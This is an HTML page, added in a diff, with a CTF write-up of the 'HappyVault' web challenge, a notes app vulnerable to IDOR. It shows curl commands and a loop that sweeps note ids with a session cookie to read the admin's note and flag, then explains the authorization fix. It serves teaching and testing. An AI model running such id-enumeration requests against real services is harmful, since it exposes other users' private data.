@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HappyVault — Web Walkthrough · Naren's Writeups</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#F7F8FB; --surface:#FFFFFF;
+    --ink:#181C28; --ink-soft:#4A5167; --muted:#8A92A6;
+    --line:#E6E9F0;
+    --accent:#5145CD; --accent-2:#6C5CE7; --accent-soft:#ECEAFB;
+    --flag:#1E8E5A; --flag-soft:#E6F4EC;
+    --warn:#C2680C; --warn-soft:#FBF0E2;
+    --code-bg:#1B1E2B; --code-ink:#E7E9F2; --code-gutter:#5A6178; --code-line:#2A2E3F;
+    --k:#B79DFF; --s:#85D6A6; --c:#6B7280; --n:#F0A868; --f:#69B7FF;
+    --radius:10px; --maxw:760px;
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:'Inter',system-ui,sans-serif;font-size:16.5px;line-height:1.72;-webkit-font-smoothing:antialiased;}
+  a{color:inherit;text-decoration:none;}
+  .wrap{max-width:var(--maxw);margin:0 auto;padding:0 24px;}
+
+  /* top chrome */
+  .topbar{border-bottom:1px solid var(--line);background:var(--surface);}
+  .topbar .wrap{display:flex;align-items:center;gap:18px;padding:16px 24px;flex-wrap:wrap;}
+  .logo{display:flex;align-items:center;gap:10px;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:18px;letter-spacing:-.01em;}
+  .logo .mark{width:26px;height:26px;border-radius:7px;background:var(--accent);color:#fff;display:grid;place-items:center;font-size:14px;}
+  .logo small{display:block;font-family:'Inter',sans-serif;font-weight:500;font-size:12px;color:var(--muted);}
+  .topnav{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap;}
+  .topnav a{font-size:14.5px;font-weight:500;color:var(--ink-soft);padding:7px 13px;border-radius:8px;transition:.15s;}
+  .topnav a:hover,.topnav a:focus-visible{color:var(--accent);background:var(--accent-soft);}
+
+  /* article header */
+  article{padding:36px 0 8px;}
+  .crumb{font-size:13px;color:var(--muted);font-family:'JetBrains Mono',monospace;}
+  .crumb a:hover{color:var(--accent);}
+  .badges{display:flex;gap:8px;margin:18px 0 0;flex-wrap:wrap;}
+  .pill{font-size:12px;font-weight:600;padding:4px 11px;border-radius:100px;}
+  .pill.cat{background:var(--accent-soft);color:var(--accent);}
+  .pill.diff{background:var(--flag-soft);color:var(--flag);}
+  h1{font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:clamp(28px,5.2vw,40px);line-height:1.14;letter-spacing:-.02em;margin:14px 0 0;}
+  .post-meta{display:flex;gap:18px;margin-top:14px;color:var(--muted);font-size:14px;flex-wrap:wrap;}
+  .post-meta span{display:flex;align-items:center;gap:6px;}
+
+  /* prev/next strip */
+  .seqnav{display:flex;justify-content:space-between;gap:12px;margin-top:22px;padding:12px 0;border-top:1px solid var(--line);border-bottom:1px solid var(--line);font-size:13.5px;}
+  .seqnav a{color:var(--ink-soft);display:flex;flex-direction:column;}
+  .seqnav a small{color:var(--muted);font-size:11.5px;text-transform:uppercase;letter-spacing:.08em;}
+  .seqnav a:hover{color:var(--accent);}
+  .seqnav .next{text-align:right;}
+
+  /* TOC */
+  .toc{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);padding:16px 20px;margin:26px 0 6px;}
+  .toc b{font-family:'Space Grotesk',sans-serif;font-size:12px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);}
+  .toc ol{margin:10px 0 0;padding-left:18px;color:var(--ink-soft);font-size:14.5px;}
+  .toc a:hover{color:var(--accent);}
+
+  /* prose */
+  .prose{padding:8px 0 0;}
+  .prose h2{font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:22px;letter-spacing:-.01em;margin:38px 0 10px;padding-top:6px;}
+  .prose h2 .hash{color:var(--accent);font-weight:500;margin-right:8px;}
+  .prose p{color:var(--ink-soft);margin:0 0 16px;}
+  .prose strong{color:var(--ink);}
+  .prose code{font-family:'JetBrains Mono',monospace;font-size:13.5px;background:var(--accent-soft);color:var(--accent);padding:1.5px 6px;border-radius:5px;}
+
+  /* code block */
+  .code{margin:18px 0;border-radius:var(--radius);overflow:hidden;border:1px solid var(--line);box-shadow:0 6px 22px rgba(24,28,40,.06);}
+  .code-head{display:flex;align-items:center;gap:7px;background:#13151F;padding:9px 14px;}
+  .code-head .d{width:10px;height:10px;border-radius:50%;background:#3A3F52;}
+  .code-head .lang{margin-left:auto;font-family:'JetBrains Mono',monospace;font-size:11.5px;color:#7B8197;text-transform:uppercase;letter-spacing:.06em;}
+  .code-body{display:flex;background:var(--code-bg);overflow-x:auto;}
+  .gutter{flex:none;padding:14px 0 14px 16px;text-align:right;color:var(--code-gutter);font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.7;user-select:none;border-right:1px solid var(--code-line);margin-right:14px;}
+  .src{margin:0;padding:14px 16px 14px 0;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.7;color:var(--code-ink);white-space:pre;}
+  .k{color:var(--k);}.s{color:var(--s);}.c{color:var(--c);font-style:italic;}.n{color:var(--n);}.fn{color:var(--f);}
+
+  /* callouts */
+  .note{border-left:3px solid var(--accent);background:var(--accent-soft);padding:13px 16px;border-radius:0 8px 8px 0;margin:18px 0;font-size:15px;color:var(--ink-soft);}
+  .note b{color:var(--accent);}
+  .warn{border-left:3px solid var(--warn);background:var(--warn-soft);padding:13px 16px;border-radius:0 8px 8px 0;margin:18px 0;font-size:15px;color:var(--ink-soft);}
+  .warn b{color:var(--warn);}
+  .flagbox{border:1px dashed var(--flag);background:var(--flag-soft);border-radius:var(--radius);padding:16px 18px;margin:20px 0;}
+  .flagbox small{font-family:'Space Grotesk',sans-serif;font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--flag);font-weight:600;}
+  .flagbox .val{font-family:'JetBrains Mono',monospace;font-size:15px;color:var(--ink);margin-top:5px;word-break:break-all;}
+
+  /* tags + related */
+  .tags{display:flex;gap:8px;flex-wrap:wrap;margin:30px 0 0;padding-top:24px;border-top:1px solid var(--line);}
+  .tag{font-size:12.5px;color:var(--accent);background:var(--accent-soft);padding:5px 12px;border-radius:100px;}
+  .related h3{font-family:'Space Grotesk',sans-serif;font-size:13px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);margin:34px 0 14px;}
+  .rgrid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+  .rcard{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);padding:16px 18px;transition:.15s;}
+  .rcard:hover{border-color:var(--accent);transform:translateY(-2px);}
+  .rcard .m{font-size:11.5px;color:var(--muted);font-family:'JetBrains Mono',monospace;}
+  .rcard h4{font-family:'Space Grotesk',sans-serif;font-size:16px;font-weight:600;margin:6px 0 0;letter-spacing:-.01em;}
+  @media (max-width:560px){.rgrid{grid-template-columns:1fr;}}
+
+  footer{margin-top:46px;border-top:1px solid var(--line);background:var(--surface);}
+  footer .wrap{display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;padding:24px 24px 40px;color:var(--muted);font-size:13.5px;}
+  footer a:hover{color:var(--accent);}
+  :focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:3px;}
+  @media (prefers-reduced-motion:reduce){*{transition:none!important;scroll-behavior:auto;}}
+</style>
+</head>
+<body>
+  <div class="topbar">
+    <div class="wrap">
+      <a class="logo" href="#"><span class="mark">N</span><span>Naren's Writeups<small>CTF · web · pwn · crypto notes</small></span></a>
+      <nav class="topnav">
+        <a href="#">Home</a><a href="#">Writeups</a><a href="#">Tags</a><a href="#">About</a>
+      </nav>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <article>
+      <div class="crumb"><a href="#">writeups</a> / <a href="#">web</a> / happyvault</div>
+      <div class="badges"><span class="pill cat">Web Exploitation</span><span class="pill diff">Difficulty: Easy</span></div>
+      <h1>HappyVault — Reading other people's notes (IDOR)</h1>
+      <div class="post-meta">
+        <span>📅 Published 2026-06-22</span>
+        <span>⏱ 5 min read</span>
+        <span>🚩 Flag captured</span>
+      </div>
+      <div class="seqnav">
+        <a class="prev" href="#"><small>← Previous</small>SimpleLogin — Auth bypass</a>
+        <a class="next" href="#"><small>Next →</small>TokenForge — JWT none-alg</a>
+      </div>
+
+      <div class="toc">
+        <b>On this page</b>
+        <ol>
+          <li><a href="#challenge">The challenge</a></li>
+          <li><a href="#recon">Recon</a></li>
+          <li><a href="#theory">Why this works</a></li>
+          <li><a href="#exploit">Getting the flag</a></li>
+          <li><a href="#fix">How you'd fix it</a></li>
+        </ol>
+      </div>
+    </article>
+
+    <div class="prose">
+      <h2 id="challenge"><span class="hash">#</span>The challenge</h2>
+      <p>HappyVault is a small "private notes" web app. You get an account, you save notes, nobody else can see them. Or so the description claims. Our job is to read the note belonging to the admin, which contains the flag.</p>
+      <p>Target: <code>https://happyvault.chal.example/</code>. Sign up, log in, and you land on your notes dashboard.</p>
+
+      <h2 id="recon"><span class="hash">#</span>Recon</h2>
+      <p>After logging in, opening a note makes a request to a predictable endpoint. Let's watch it with <code>curl</code>, reusing our session cookie:</p>
+      <div class="code">
+        <div class="code-head"><span class="d"></span><span class="d"></span><span class="d"></span><span class="lang">bash</span></div>
+        <div class="code-body">
+          <div class="gutter">1
+2
+3
+4
+5</div>
+<pre class="src"><span class="c"># grab our own note — note the id in the URL</span>
+$ curl -s -b <span class="s">"session=eyJ1aWQiOj4...""</span> \
+       https://happyvault.chal.example/api/note?id=<span class="n">4081</span>
+
+{<span class="s">"id"</span>:<span class="n">4081</span>,<span class="s">"owner"</span>:<span class="s">"naren"</span>,<span class="s">"body"</span>:<span class="s">"grocery list"</span>}</pre>
+        </div>
+      </div>
+      <p>The note is fetched purely by its numeric <code>id</code>. The server never seems to check whether that note actually belongs to us — it just trusts the id in the request.</p>
+
+      <div class="note"><b>Note —</b> Whenever an app fetches a resource by an id you can change, ask the obvious question: <em>does the server verify you're allowed to see it?</em></div>
+
+      <h2 id="theory"><span class="hash">#</span>Why this works</h2>
+      <p>This is a textbook <strong>IDOR</strong> — Insecure Direct Object Reference. The app exposes an internal identifier (the note id) directly to the user and uses it to look things up, but forgets the authorization step. Knowing the id is treated as the same thing as being allowed to read it. They're not the same thing.</p>
+
+      <h2 id="exploit"><span class="hash">#</span>Getting the flag</h2>
+      <p>If ids are sequential, the admin's note is probably an early one. Let's walk the low ids:</p>
+      <div class="code">
+        <div class="code-head"><span class="d"></span><span class="d"></span><span class="d"></span><span class="lang">bash</span></div>
+        <div class="code-body">
+          <div class="gutter">1
+2
+3
+4
+5
+6</div>
+<pre class="src"><span class="c"># sweep the first handful of note ids</span>
+$ <span class="k">for</span> id <span class="k">in</span> $(seq <span class="n">1</span> <span class="n">10</span>); <span class="k">do</span>
+    curl -s -b <span class="s">"session=eyJ1aWQiOjQ..."</span> \
+         https://happyvault.chal.example/api/note?id=$id
+  <span class="k">done</span>
+
+{<span class="s">"id"</span>:<span class="n">3</span>,<span class="s">"owner"</span>:<span class="s">"admin"</span>,<span class="s">"body"</span>:<span class="s">"flag: CTF{idor_is_an_access_control_bug}"</span>}</pre>
+        </div>
+      </div>
+      <p>Note <code>id=3</code> belongs to <strong>admin</strong>, and the server hands it over without a second thought.</p>
+
+      <div class="flagbox">
+        <small>Flag</small>
+        <div class="val">CTF{idor_is_an_access_control_bug}</div>
+      </div>
+
+      <h2 id="fix"><span class="hash">#</span>How you'd fix it</h2>
+      <p>The fix isn't to hide or randomise the id (that's just slowing an attacker down). It's to add the missing check: on every lookup, confirm the note's owner matches the logged-in user before returning it.</p>
+      <div class="warn"><b>Heads up —</b> UUIDs instead of sequential ids make sweeping harder, but an IDOR is still an IDOR. Authorization is the real fix, obscurity is not.</div>
+
+      <div class="tags">
+        <span class="tag">#web</span><span class="tag">#idor</span><span class="tag">#access-control</span><span class="tag">#beginner</span>
+      </div>
+
+      <div class="related">
+        <h3>Related writeups</h3>
+        <div class="rgrid">
+          <a class="rcard" href="#"><div class="m">WEB · MEDIUM</div><h4>TokenForge — forging a JWT with alg:none</h4></a>
+          <a class="rcard" href="#"><div class="m">WEB · EASY</div><h4>SimpleLogin — bypassing a broken auth check</h4></a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <div class="wrap">
+      <div>© 2026 Naren · Bangalore — writeups are for learning on legal targets only</div>
+      <div><a href="#">GitHub</a> · <a href="#">RSS</a> · <a href="#">About</a></div>
+    </div>
+  </footer>
+</body>
+</html>
